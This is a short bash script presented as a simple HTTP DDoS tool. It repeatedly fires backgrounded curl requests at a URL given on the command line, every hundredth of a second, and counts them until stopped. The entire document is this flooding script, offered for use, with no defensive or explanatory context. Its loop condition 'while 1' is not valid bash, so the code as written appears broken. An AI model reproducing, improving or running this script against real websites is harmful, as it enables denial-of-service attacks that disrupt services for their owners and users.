#!/bin/bash
#Le simple linux http ddos
echo "Le Simple HTTP DDos Tool , Control-C to stop"
let x=0
while 1
do
  curl -s $1 >/dev/null & #| wc -c&
  sleep 0.01
  let ++x
  printf "\r request($x)" 
done
exit 0
